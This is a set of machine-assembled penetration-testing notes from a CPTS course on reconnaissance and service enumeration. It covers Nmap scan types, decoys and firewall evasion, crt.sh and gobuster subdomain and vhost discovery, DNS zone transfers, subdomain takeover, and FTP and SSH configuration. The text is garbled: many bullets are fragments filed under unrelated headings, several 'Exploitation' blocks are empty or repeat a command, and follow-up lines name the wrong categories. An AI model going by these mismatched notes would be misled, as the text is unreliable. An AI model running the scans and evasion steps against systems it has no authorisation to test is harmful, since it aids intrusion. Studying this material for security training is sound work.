## 2. Passive Subdomain Enumeration

Aliases: —  
Tags: discover, dns, domain, subdomain  
Category: Reconnaissance / Subdomains  
OS: Cross-platform / not specified  
Service: DNS  
Ports: 53

### Remember this attack when

- This relies on external sources of information to discover subdomains without directly querying the target's DNS servers.
- Additionally, various online databases and tools aggregate DNS data from multiple sources, allowing you to search for subdomains without directly interacting with the target.

<a id="technique-banner-grabbing"></a>
## Banner Grabbing

Aliases: —  
Tags: curl, dns, host, http, imap, nmap, pop3, port, scan, service, smtp, ssh, sudo  
Category: Reconnaissance / Service Enumeration; Fingerprinting  
OS: Cross-platform, Linux  
Service: DNS, HTTP, IMAP, POP3, SMTP, SSH  
Ports: 22, 25, 53, 80, 110, 143, 465, 587, 993, 995

### Remember this attack when

- If it cannot identify versions through the banners, Nmap attempts to identify them through a signature-based matching system, but this significantly increases the scan's duration.
- | --- If we look at the results from Nmap, we can see the port's status, service name, and hostname.
- If we manually connect to the SMTP server using nc, grab the banner, and intercept the network traffic using tcpdump, we can see what Nmap did not show us.

### Prerequisites

- | [ACK] | 18:28:07.255281 IP 10.10.14.2.59618 10.129.2.28.smtp: Flags [.], | After that, the target SMTP server sends us a TCP packet with the PSH and ACK flags, where PSH states that the target server is sending data to us and with ACK simultaneously informs us that all required data has been sent.


### What success looks like

- | --- If we look at the results from Nmap, we can see the port's status, service name, and hostname.
- Nevertheless, let us look at this line here: NSOCK INFO [0.4200s] nsocktracehandlercallback(): Callback: READ SUCCESS for EID 18 [10.129.2.28:25] (35 bytes): 220 inlane ESMTP Postfix (Ubuntu)..
- It happens because, after a successful three-way handshake, the server often sends a banner for identification.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Service Enumeration; Fingerprinting` → re-enumerate with the gained access.

### Common problems / Why it fails

- If it cannot identify versions through the banners, Nmap attempts to identify them through a signature-based matching system, but this significantly increases the scan's duration.

- No separately named variant was identified in the cited CPTS subsection.

<a id="technique-crt-sh-lookup"></a>
## crt.sh lookup

Aliases: —  
Tags: curl, domain, subdomain  
Category: Reconnaissance / Certificate Transparency Logs  
OS: Cross-platform, Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- Let's see how to find all 'dev' subdomains on facebook.com using curl and jq: - curl -s "https://crt.sh/?q=facebook.com&output=json": This command fetches the JSON output from crt.sh for certificates matching the domain facebook.com.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### Enumeration / Detection

```shell-session
[!bash!]$ curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[]
 | select(.name_value | contains("dev")) | .name_value' | sort -u
 
*.dev.facebook.com
*.newdev.facebook.com
*.secure.dev.facebook.com
dev.facebook.com
devvm1958.ftw3.facebook.com
facebook-amex-dev.facebook.com
facebook-amex-sign-enc-dev.facebook.com
newdev.facebook.com
secure.dev.facebook.com
```

- The -r flag tells jq to output raw strings.

<a id="technique-decoys"></a>
## Decoys

Aliases: —  
Tags: dns, evasion, host, http, nmap, port, scan, service, sudo  
Category: Reconnaissance / Firewall and IDS/IPS Evasion  
OS: Cross-platform, Linux  
Service: DNS, HTTP  
Ports: 53, 80

### Remember this attack when

- Another example is when IPS should block us.
- So we can also manually specify the source IP address (-S) to test if we get better results with this one.

### Prerequisites

- This prevents any access to the target network.
- Another critical point is that the decoys must be alive.
- Otherwise, the service on the target may be unreachable due to SYN-flooding security mechanisms.

### Enumeration / Detection

<a id="technique-discovering-open-tcp-ports"></a>
## Discovering Open TCP Ports

Aliases: —  
Tags: dns, ftp, host, http, https, nmap, pop3, port, scan, service, smtp, ssh, sudo  
Category: Reconnaissance / Host and Port Scanning  
OS: Cross-platform, Linux  
Service: DNS, FTP, HTTP, HTTPS, POP3, SMTP, SSH  
Ports: 21, 22, 25, 53, 80, 110, 443, 465, 587, 995

### Remember this attack when

- This SYN scan is set only to default when we run it as root because of the socket permissions required to create raw TCP packets.
- This means that if we do not define ports and scanning methods, these parameters are set automatically.
- If we trace the packets Nmap sends, we will see the RST flag on TCP port 21 that our target sends back to us.

### Prerequisites

- This SYN scan is set only to default when we run it as root because of the socket permissions required to create raw TCP packets.

### Enumeration / Detection

- In the next RCVD line, we can see that the target responds with a TCP packet containing the RST and ACK flags (RA).

<a id="technique-discovering-open-udp-ports"></a>
## Discovering Open UDP Ports

Aliases: —  
Tags: dns, host, nmap, port, scan, service, sudo  
Category: Reconnaissance / Host and Port Scanning  
OS: Linux  
Service: DNS  
Ports: 53

### Remember this attack when

- So we cannot determine if the UDP packet has arrived at all or not.
- If the UDP port is open, we only get a response if the application is configured to do so.
- | ---- If we get an ICMP response with error code 3 (port unreachable), we know that the port is indeed closed.

### Prerequisites

- Since UDP is a stateless protocol and does not require a three-way handshake like TCP.
- | ---- If we get an ICMP response with error code 3 (port unreachable), we know that the port is indeed closed.

## DNS Proxying

Aliases: —  
Tags: dns, evasion, host, nmap, port, scan, service, sudo, transfer  
Category: Reconnaissance / Firewall and IDS/IPS Evasion  
OS: Cross-platform, Linux  
Service: DNS  
Ports: 53

### Remember this attack when

- By default, Nmap performs a reverse DNS resolution unless otherwise specified to find more important information about our target.
- This method could be fundamental to us if we are in a demilitarized zone (DMZ).

<a id="technique-filtered-ports"></a>
## Filtered Ports

Aliases: —  
Tags: dns, host, nmap, port, scan, service, sudo  
Category: Reconnaissance / Host and Port Scanning  
OS: Linux  
Service: DNS  
Ports: 53

### Remember this attack when

- When a port is shown as filtered, it can have several reasons.
- When a packet gets dropped, Nmap receives no response from our target, and by default, the retry rate (--max-retries) is set to 10.
- This means Nmap will resend the request to the target port to determine if the previous packet was accidentally mishandled or not.

### Prerequisites

- | As a response, we receive an ICMP reply with type 3 and error code 3, which indicates that the desired port is unreachable.

### Enumeration / Detection


## FinalRecon

Aliases: —  
Tags: abuse, discover, dns, domain, port, scan, subdomain  
Category: Reconnaissance / Automating Recon  
OS: Cross-platform, Linux  
Service: DNS  
Ports: 53

### Remember this attack when

- FinalRecon offers a wealth of recon information: - Header Information: Reveals server details, technologies used, and potential security misconfigurations.
- - Crawler: - HTML, CSS, JavaScript: Extracts links, resources, and potential vulnerabilities from these files.
- - Images, robots.txt, sitemap.xml: Gathers information about allowed/disallowed crawling paths and website structure.

### Prerequisites

- Once inside, you will install the required Python dependencies using pip3 install -r requirements.txt.
- To ensure that the main script is executable, you will need to change the file permissions using chmod +x ./finalrecon.py.

### Enumeration / Detection

```shell-session

[!bash!]$ cd FinalRecon
[!bash!]$ pip3 install -r requirements.txt
[!bash!]$ chmod +x ./finalrecon.py
[!bash!]$ ./finalrecon.py --help

usage: finalrecon.py [-h] [--url URL] [--headers] [--sslinfo] [--whois]
```

## gobuster

Aliases: —  
Tags: brute, dns, domain, host, http, vhost  
Category: Reconnaissance / Virtual Hosts  
OS: Cross-platform, Linux  
Service: DNS, HTTP  
Ports: 53, 80

### Remember this attack when

- Gobuster is a versatile tool commonly used for directory and file brute-forcing, but it also excels at virtual host discovery.
- It systematically sends HTTP requests with different Host headers to a target IP address and then analyses the responses to identify valid virtual hosts.
- Target Identification: First, identify the target web server's IP address.

### Prerequisites

- There are a couple of things you need to prepare to brute force Host headers: 1.
- In newer versions of Gobuster, the --append-domain flag is required to append the base domain to each word in the wordlist when performing virtual host discovery.
- Users of older versions might not find this flag available or needed, as the tool appended the base domain by default or employed a different mechanism for virtual host generation.

### Enumeration / Detection

```shell-session
[!bash!]$ gobuster vhost -u http://<target_IP_address> -w <wordlist_file> --append-domain
```

- | | closed | When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag.

- We will only understand the results if we know what they mean and how they are obtained.
- | | filtered | Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.
- | | unfiltered | This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.

- Your Computer Asks for Directions (DNS Query): When you enter the domain name, your computer first checks its memory (cache) to see if it remembers the IP address from a previous visit.
- If not, it reaches out to a DNS resolver, usually provided by your internet service provider (ISP).

## How Virtual Hosts Work: Understanding VHosts and Subdomains

Aliases: —  
Tags: discover, dns, domain, host, http, subdomain, vhost  
Category: Reconnaissance / Virtual Hosts  
OS: Cross-platform  
Service: DNS, HTTP  
Ports: 53, 80

### Remember this attack when

- - Virtual Hosts (VHosts): Virtual hosts are configurations within a web server that allow multiple websites or applications to be hosted on a single server.
- If a virtual host does not have a DNS record, you can still access it by modifying the hosts file on your local machine.
- The hosts file allows you to map a domain name to an IP address manually, bypassing DNS resolution.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### Enumeration / Detection

```apacheconf

    DocumentRoot /var/www/example1
</VirtualHost>

<VirtualHost *:80>
    ServerName www.example2.org
    DocumentRoot /var/www/example2
</VirtualHost>

<VirtualHost *:80>

    DocumentRoot /var/www/another-example
</VirtualHost>
```

### What success looks like

- The dropped packets are ignored, and no response is returned from the host.
- TCP packets are returned with an RST flag, while ICMP can contain different types of error codes.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Firewall and IDS/IPS Evasion` → re-enumerate with the gained access.

### Common problems / Why it fails

- TCP packets are returned with an RST flag, while ICMP can contain different types of error codes.
- Unlike outgoing connections, all connection attempts (with the SYN flag) from external networks are usually blocked by firewalls.
- However, the packets with the ACK flag are often passed by the firewall because the firewall cannot determine whether the connection was first established from the external network or the internal network.

<a id="technique-nessus-plugins"></a>
## Nessus Plugins

Aliases: —  
Tags: attack, host, scan  
Category: Reconnaissance / Advanced Settings  
OS: Cross-platform, Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- Nessus works with plugins written in the Nessus Attack Scripting Language (NASL) and can target new vulnerabilities and CVEs.
- These plugins contain information such as the vulnerability name, impact, remediation, and a way to test for the presence of a particular issue.
- When conducting recurring scans, there may be a vulnerability/detection that, upon further examination, is not considered to be an issue.

### Prerequisites

- SSL/TLS is not required in this case, and implementing it would result in a negative performance impact.

### Enumeration / Detection

```shell-session
[!bash!]$ sslscan example.com

<SNIP>

Preferred TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve 25519 DHE 253
Accepted  TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve 25519 DHE 253
Accepted  TLSv1.0  128 bits  DHE-RSA-AES128-SHA            DHE 2048 bits
Accepted  TLSv1.0  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits
Accepted  TLSv1.0  128 bits  AES128-SHA                   
Accepted  TLSv1.0  256 bits  AES256-SHA                   

<SNIP>
```

### Exploitation

```shell-session
[!bash!]$ sslscan example.com

<SNIP>

Accepted  TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve 25519 DHE 253

```

### What success looks like

- For example, Microsoft DirectAccess (a technology that provides internal network connectivity to clients over the Internet) allows insecure and null cipher suites.
- In the new plugin rule, we input the host to be excluded, along with the Plugin ID for Microsoft DirectAccess, and specify the action to be performed as Hide this result: New Rule form with fields for Host, Plugin ID, Expiration Date, and Severity dropdown.

### What to do next

- These plugins contain information such as the vulnerability name, impact, remediation, and a way to test for the presence of a particular issue.

- Nikto is pre-installed on pwnbox, but if you need to install it, you can run the following commands: To scan inlanefreight.com using Nikto, only running the fingerprinting modules, execute the following command: The -h flag specifies the target host.

<a id="technique-nmap-scripting-engine"></a>
## Nmap Scripting Engine

Aliases: —  
Tags: brute, exploit, host, http, nmap, port, scan, service, smtp, sudo  
Category: Reconnaissance / Nmap Scripting Engine  
OS: Cross-platform, Linux  
Service: HTTP, SMTP  
Ports: 25, 80, 465, 587

### Remember this attack when

- | | broadcast | Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
- | | discovery | Evaluation of accessible services.
- | | dos | These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.

### Prerequisites

- There are a total of 14 categories into which these scripts can be divided: |Category|Description| |-|-| | auth | Determination of authentication credentials.
- | | brute | Executes scripts that try to log in to the respective service by brute-forcing with credentials.

<a id="technique-rates"></a>
## Rates

Aliases: —  
Tags: nmap, scan, sudo  
Category: Reconnaissance / Performance  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- During a white-box penetration test, we may get whitelisted for the security systems to check the systems in the network for vulnerabilities and not only test the protection measures.
- If we know the network bandwidth, we can work with the rate of packets sent, which significantly speeds up our scans with Nmap.
- When setting the minimum rate (--min-rate ) for sending packets, we tell Nmap to simultaneously send the specified number of packets.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### Enumeration / Detection

```shell-session
[!bash!]$ sudo nmap 10.129.2.0/24 -F -oN tnet.default

<SNIP>
Nmap done: 256 IP addresses (10 hosts up) scanned in 29.83 seconds
```

```shell-session
[!bash!]$ sudo nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300

<SNIP>
Nmap done: 256 IP addresses (10 hosts up) scanned in 8.67 seconds
```

```shell-session
[!bash!]$ cat tnet.default | grep "/tcp" | wc -l

23
```

```shell-session
[!bash!]$ cat tnet.minrate300 | grep "/tcp" | wc -l

23
```

### Exploitation

```shell-session
[!bash!]$ cat tnet.minrate300 | grep "/tcp" | wc -l

```

<a id="technique-remediation"></a>
## Remediation

Aliases: —  
Tags: dns, domain, service, transfer  
Category: Reconnaissance / DNS Zone Transfers  
OS: Cross-platform, Linux, Windows  
Service: DNS  
Ports: 53

### Remember this attack when

- Fortunately, awareness of this vulnerability has grown, and most DNS server administrators have mitigated the risk.
- Modern DNS servers are typically configured to allow zone transfers only to trusted secondary servers, ensuring that sensitive zone data remains confidential.
- However, misconfigurations can still occur due to human error or outdated practices.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

<a id="technique-robots-txt-additional-cpts-example"></a>
## robots.txt — Additional CPTS Example

Aliases: —  
Tags: service  
Category: Reconnaissance / robots.txt  
OS: Cross-platform  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- It acts as a virtual "etiquette guide" for bots, outlining which areas of a website they are allowed to access and which are off-limits.
- It adheres to the Robots Exclusion Standard, guidelines for how web crawlers should behave when visiting a website.
- For example, a directive might look like this: This directive tells all user-agents ( is a wildcard) that they are not allowed to access any URLs that start with /private/.

### Prerequisites

- Other directives can allow access to specific directories or files, set crawl delays to avoid overloading a server or provide links to sitemaps for efficient crawling.
- | Disallow: /admin/ (disallow access to the admin directory) | | Allow | Explicitly permits the bot to crawl specific paths or patterns, even if they fall under a broader Disallow rule.
- | Allow: /public/ (allow access to the public directory) | | Crawl-delay | Sets a delay (in seconds) between successive requests from the bot to avoid overloading the server.

### Enumeration / Detection

```txt
User-agent: *
Disallow: /private/
```

## Scan Single IP

Aliases: —  
Tags: host, nmap, port, scan, sudo  
Category: Reconnaissance / Host Discovery  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- Before we scan a single host for open ports and its services, we first have to determine if it is alive or not.
- | If we disable port scan (-sn), Nmap automatically ping scan with ICMP Echo Requests (-PE).
- Once such a request is sent, we usually expect an ICMP reply if the pinging host is alive.

<a id="technique-scan-techniques"></a>
## Scan Techniques

Aliases: —  
Tags: ftp, host, http, nmap, port, postgresql, relay, scan, ssh, sudo  
Category: Reconnaissance / Introduction to Nmap  
OS: Cross-platform, Linux  
Service: FTP, HTTP, SSH, postgresql  
Ports: 21, 22, 80, 5432

### Remember this attack when

- If our target sends a SYN-ACK flagged packet back to us, Nmap detects that the port is open.
- If the target responds with an RST flagged packet, it is an indicator that the port is closed.
- If Nmap does not receive a packet back, it will display it as filtered.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### Enumeration / Detection

```shell-session
[!bash!]$ nmap --help

<SNIP>
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags <flags>: Customize TCP scan flags
  -sI <zombie host[:probeport]>: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b <FTP relay host>: FTP bounce scan
<SNIP>
```

```shell-session
[!bash!]$ sudo nmap -sS localhost

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 22:50 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000010s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5432/tcp open  postgresql
5901/tcp open  vnc-1

Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
```

### Exploitation

```shell-session
[!bash!]$ sudo nmap -sS localhost

```

### What success looks like

- Here we can see all the scanning techniques Nmap offers: For example, the TCP-SYN scan (-sS) is one of the default settings unless we have defined otherwise and is also one of the most popular scan methods.
- In this example, we can see that we have four different TCP ports open.

<a id="technique-server-vhost-lookup"></a>
## Server VHost Lookup

Aliases: —  
Tags: domain, host, http, vhost  
Category: Reconnaissance / Virtual Hosts  
OS: Cross-platform  
Service: HTTP  
Ports: 80

### Remember this attack when

- Browser Requests a Website: When you enter a domain name (e.g., www.inlanefreight.com) into your browser, it initiates an HTTP request to the web server associated with that domain's IP address.
- Web Server Determines the Virtual Host: The web server receives the request, examines the Host header, and consults its virtual host configuration to find a matching entry for the requested domain name.
- Serving the Right Content: Upon identifying the correct virtual host configuration, the web server retrieves the corresponding files and resources associated with that website from its document root and sends them back to the browser as the HTTP response.

<a id="technique-web-recon-and-well-known"></a>
## Web Recon and .well-known

Aliases: —  
Tags: token  
Category: Reconnaissance / .Well-Known URIs  
OS: Cross-platform  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- In web recon, the .well-known URIs can be invaluable for discovering endpoints and configuration details that can be further tested during a penetration test.
- The openid-configuration URI is part of the OpenID Connect Discovery protocol, an identity layer built on top of the OAuth 2.0 protocol.
- When a client application wants to use OpenID Connect for authentication, it can retrieve the OpenID Connect Provider's configuration by accessing the https://example.com/.well-known/openid-configuration endpoint.

### Prerequisites

- As demonstrated with the openid-configuration endpoint above, these standardized URIs provide structured access to critical metadata and configuration details, enabling security professionals to comprehensively map out a website's security landscape.

### Enumeration / Detection

```json
{
  "issuer": "https://example.com",
  "authorization_endpoint": "https://example.com/oauth2/authorize",
  "token_endpoint": "https://example.com/oauth2/token",
  "userinfo_endpoint": "https://example.com/oauth2/userinfo",
  "jwks_uri": "https://example.com/oauth2/jwks",
  "response_types_supported": ["code", "token", "id_token"],
  "subject_types_supported": ["public"],
  "id_token_signing_alg_values_supported": ["RS256"],
  "scopes_supported": ["openid", "profile", "email"]
}
```

### Exploitation

```json

  "issuer": "https://example.com",

}
```

### What success looks like

- When a client application wants to use OpenID Connect for authentication, it can retrieve the OpenID Connect Provider's configuration by accessing the https://example.com/.well-known/openid-configuration endpoint.
- This endpoint returns a JSON document containing metadata about the provider's endpoints, supported authentication methods, token issuance, and more: The information obtained from the openid-configuration endpoint provides multiple exploration opportunities: 1.
- As demonstrated with the openid-configuration endpoint above, these standardized URIs provide structured access to critical metadata and configuration details, enabling security professionals to comprehensively map out a website's security landscape.

- For instance, on Windows, SMB can run directly over port 445 TCP/IP without the need for NetBIOS over TCP/IP, but if Windows has NetBIOS enabled, or we are targetting a non-Windows host, we will find SMB running on port 139 TCP/IP.

<a id="technique-cloud-resources"></a>
## Cloud Resources

Aliases: —  
Tags: discover, dns, domain, host, password, ssh  
Category: Service Enumeration / Cloud Resources  
OS: Cross-platform, Linux, Windows  
Service: DNS, SSH  
Ports: 22, 53

### Remember this attack when

- Even though cloud providers secure their infrastructure centrally, this does not mean that companies are free from vulnerabilities.
- The configurations made by the administrators may nevertheless make the company's cloud resources vulnerable.
- This often starts with the S3 buckets (AWS), blobs (Azure), cloud storage (GCP), which can be accessed without authentication if configured incorrectly.

### Prerequisites

- After all, all companies want to be able to do their work from anywhere, so they need a central point for all management.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

```shell-session
[!bash!]$ for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done

blog.inlanefreight.com 10.129.24.93
inlanefreight.com 10.129.27.33
matomo.inlanefreight.com 10.129.127.22
www.inlanefreight.com 10.129.127.33
s3-website-us-west-2.amazonaws.com 10.129.95.250
```

### What success looks like

- This often starts with the S3 buckets (AWS), blobs (Azure), cloud storage (GCP), which can be accessed without authentication if configured incorrectly.
- We can also search for files simultaneously to see the files that can be accessed at the same time.

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Cloud Resources` → re-enumerate with the gained access.

### Common problems / Why it fails

- This often starts with the S3 buckets (AWS), blobs (Azure), cloud storage (GCP), which can be accessed without authentication if configured incorrectly.
- Includes social media links, external tools, IP information, and SSL certificate details with issuer and DNS names.](/storage/modules/112/cloud1.png) Another very useful provider is GrayHatWarfare.
- These errors can even lead to SSH private keys being leaked, which anyone can download and log onto one or even more machines in the company without using a password.

<a id="technique-dangerous-settings"></a>
## Dangerous Settings

Aliases: —  
Tags: attack, crack, discover, domain, ftp, hash, hashcat, host, john, metasploit, nmap, password, port, relay, service, smb, smtp, ssh, sudo, transfer, upload  
Category: Service Enumeration / FTP; SMB; SMTP; IPMI  
OS: Cross-platform, Linux, Windows  
Service: FTP, SMB, SMTP, SSH  
Ports: 21, 22, 25, 139, 445, 465, 587

### Remember this attack when

- This is often used to allow everyone on the internal network to share files and data without accessing each other's computers.
- With vsFTPd, the optional settings that can be added to the configuration file for the anonymous login look like this: |Setting|Description| |-|-| | anonymousenable=YES | Allowing anonymous login?
- | | anonuploadenable=YES | Allowing anonymous to upload files?

### Prerequisites

- Access to this type of service can be set temporarily or with the setting to accelerate the exchange of files.
- One of the most common configurations of FTP servers is to allow anonymous access, which does not require legitimate credentials but provides access to some files.
- However, in reality, fail2ban solutions are now a standard implementation of any infrastructure that logs the IP address and blocks all access to the infrastructure after a certain number of failed login attempts.

## Default Configuration — Service Enumeration

Aliases: —  
Tags: dns, domain, forward, ftp, hash, host, http, john, nfs, password, port, service, smb, smtp, snmp, ssh, sudo, transfer  
Category: Service Enumeration / FTP; SMB; NFS; DNS; SMTP; SNMP; Linux Remote Management Protocols  
OS: Cross-platform, Linux, Windows  
Service: DNS, FTP, HTTP, NFS, SMB, SMTP, SNMP, SSH  
Ports: 21, 22, 25, 53, 80, 111, 139, 161, 445, 465, 587, 2049

### Remember this attack when

- If we look at the configuration file of vsFTPd, we will see many options and settings that are either commented or commented out.
- In the following example, the users guest, john, and kevin are not permitted to log in to the FTP service, even if they exist on the Linux system.
- These settings look like the following when filtered out: Default Configuration We see global settings and two shares that are intended for printers.

### Prerequisites

- | rsaprivatekeyfile=/etc/ssl/private/ssl-cert-snakeoil.key| | | sslenable=NO | | In addition, there is a file called /etc/ftpusers that we also need to pay attention to, as this file is used to deny certain users access to the FTP service.
- | | create mask = 0700 | What permissions need to be set for newly created files?
- |Option|Description| |-|-| | rw | Read and write permissions.

<a id="technique-dns-zone-transfer"></a>
## DNS Zone Transfer

Aliases: —  
Tags: attack, dns, dump, port, service, transfer  
Category: Service Enumeration / Attacking DNS  
OS: Cross-platform, Linux, Windows  
Service: DNS  
Ports: 53

### Remember this attack when

- In addition, the DNS service usually runs on a UDP port; however, when performing DNS zone transfer, it uses a TCP port for reliable data transmission.
- An attacker could leverage this DNS zone transfer vulnerability to learn more about the target organization's DNS namespace, increasing the attack surface.
- For exploitation, we can use the dig utility with DNS query type AXFR option to dump the entire DNS namespaces from a vulnerable DNS server: DIG - AXFR Zone Transfer Tools like Fierce can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer: ---

### Prerequisites

- Unless a DNS server is configured correctly (limiting which IPs can perform a DNS zone transfer), anyone can ask a DNS server for a copy of its zone information since DNS zone transfers do not require any authentication.

### Enumeration / Detection

## Domain Takeovers & Subdomain Enumeration

Aliases: —  
Tags: dns, domain, exploit, host, subdomain, upload  
Category: Service Enumeration / Attacking DNS  
OS: Cross-platform, Linux  
Service: DNS  
Ports: 53

### Remember this attack when

- If attackers find an expired domain, they can claim that domain to perform further attacks such as hosting malicious content on a website or sending a phishing email leveraging the claimed domain.
- Subdomain Enumeration Before performing a subdomain takeover, we should enumerate subdomains for a target domain using tools like Subfinder.
- This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access.

## Enumeration Principles

Aliases: —  
Tags: attack, exploit, rdp, service, ssh, winrm

OS: Cross-platform / not specified

### Remember this attack when

- Enumeration is a loop in which we repeatedly gather information based on what data we have or have already discovered.
- If we imagine that we have been hired to investigate the IT security of a company, we will start to develop a general understanding of the company's functionality.
- An example of such a wrong approach could be that after finding authentication services like SSH, RDP, WinRM, and the like, we try to brute-force with common/weak passwords and usernames.

### Prerequisites

- Once we have identified targets in our client's infrastructure, we need to examine the individual services and protocols.
- For example, we need to understand how the company is structured, what services and third-party vendors it uses, what security measures may be in place, and more.
- An important aspect that must not be confused here is that there are always exceptions to the rules.

## Footprinting the Service — Service Enumeration

Aliases: —  
Tags: attack, brute, curl, dns, domain, ftp, hashcat, host, http, https, imap, ldap, metasploit, nfs, nmap, password, pop3, port, powershell, rdp, relay, rpc, scan, service, shell, smb, smtp, snmp, ssh, subdomain, sudo, ticket, transfer, winrm

OS: Cross-platform, Linux, Windows  
Service: DNS, FTP, HTTP, HTTPS, IMAP, LDAP, NFS, POP3, RDP, RPC, SMB, SMTP, SNMP, SSH, winrm  
Ports: 21, 22, 25, 53, 80, 110, 111, 135, 139, 143, 161, 389, 443, 445, 465, 587, 636, 993, 995, 2049, 3268, 3269, 3389, 5985, 5986

### Remember this attack when

- These tools make it easier for us to identify different services, even if they are not accessible on standard ports.
- Nmap FTP Scripts All the NSE scripts are located on the Pwnbox in /usr/share/nmap/scripts/, but on our systems, we can find them using a simple command.
- For example, the ftp-anon NSE script checks whether the FTP server allows anonymous access.

### Prerequisites

- Because then we need a client that can handle TLS/SSL.
- Once an anonymous user has access to a network service, it only takes one mistake to give them too many permissions or too much visibility to put the entire network at significant risk.
- Most importantly, anonymous access to such services can also lead to the discovery of other users, who can be attacked with brute-forcing in the most aggressive case.

### What success looks like

- These tools make it easier for us to identify different services, even if they are not accessible on standard ports.
- For example, the ftp-anon NSE script checks whether the FTP server allows anonymous access.
- For the NSE scripts, we see that our local machine uses other output ports (54226, 54228, 54230, 54232) and first initiates the connection with the CONNECT command.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `FTP; SMB; NFS; DNS; SMTP; IMAP / POP3; SNMP; IPMI; Linux Remote Management Protocols; Windows Remote Management Protocols` → re-enumerate with the gained access.

### Common problems / Why it fails

- Humans are more error-prone than properly configured computer processes, and the lack of security awareness and laziness often leads to weak passwords that can be easily cracked.
- List Contents with Usernames & Group Names List Contents with UIDs & GUIDs It is important to note that if the rootsquash option is set, we cannot edit the backup.sh file even as root.
- Since a DNS failure usually has severe consequences for a company, the zone file is almost invariably kept identical on several name servers.

### Variants

- No separately named variant was identified in the cited CPTS subsection.

<a id="technique-ftp-ftp"></a>
## FTP — FTP

Aliases: FTP  
Tags: ftp, http, password, port, transfer, upload  
Category: Service Enumeration / FTP  
OS: Cross-platform  
Service: FTP, HTTP  
Ports: 21, 80

### Remember this attack when

- If a connection is broken off during transmission, the transport can be resumed after re-established contact.
- However, if a firewall protects the client, the server cannot reply because all external connections are blocked.
- We also need to know that FTP is a clear-text protocol that can sometimes be sniffed if conditions on the network are right.

### Prerequisites

- Usually, we need credentials to use FTP on a server.
- We also need to know that FTP is a clear-text protocol that can sometimes be sniffed if conditions on the network are right.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### What success looks like

- The client sends commands to the server, and the server returns status codes.

<a id="technique-linux-remote-management-protocols-ssh"></a>
## Linux Remote Management Protocols — SSH

Aliases: SSH  
Tags: hash, host, password, port, shell, ssh, transfer  
Category: Service Enumeration / Linux Remote Management Protocols  
OS: Linux, Windows  
Service: SSH  
Ports: 22

### Remember this attack when

- The SSH server can also be configured to only allow connections from specific clients.
- For example, SSH-1 is vulnerable to MITM attacks, whereas SSH-2 is not.
- Only when contact is first established there is a risk of a third party interposing itself between the two participants and thus intercepting the connection.

### Prerequisites

- Therefore, we need to connect to it using the SSH protocol and authenticate ourselves to it.
- A host key cannot be imitated because it is a unique public-private key pair, and an attacker cannot forge the private key’s signature without access to it, assuming the client properly verifies the public key against a trusted source.
- After server authentication, however, the client must also prove to the server that it has access authorization.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### What success looks like

- Secure Shell (SSH) enables two computers to establish an encrypted and direct connection within a possibly insecure network on the standard port TCP 22.
- A host key cannot be imitated because it is a unique public-private key pair, and an attacker cannot forge the private key’s signature without access to it, assuming the client properly verifies the public key against a trusted source.
- After server authentication, however, the client must also prove to the server that it has access authorization.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Linux Remote Management Protocols` → re-enumerate with the gained access.

### Common problems / Why it fails

- A host key cannot be imitated because it is a unique public-private key pair, and an attacker cannot forge the private key’s signature without access to it, assuming the client properly verifies the public key against a trusted source.
- The server creates a cryptographic problem with the client's public key and sends it to the client.
- The client, in turn, decrypts the problem with its own private key, sends back the solution, and thus informs the server that it may establish a legitimate connection.

### Variants

- SSH

